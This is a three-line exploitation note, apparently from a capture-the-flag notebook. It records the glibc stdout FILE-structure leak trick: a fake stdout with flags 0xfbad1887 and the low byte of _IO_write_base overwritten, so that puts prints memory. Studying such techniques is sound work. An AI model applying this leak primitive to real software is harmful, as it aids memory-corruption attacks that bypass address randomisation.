- `fake stdout = p64(0xfbad1887) + p64(0) * 3 + p8(0)`
- overwrite LSB of `_IO_write_base` to `\x00`, so that when `puts` called, it will print everything from `_IO_write_base` to `_IO_write_end`
- basic exploit: check #14 in [[heap trick]]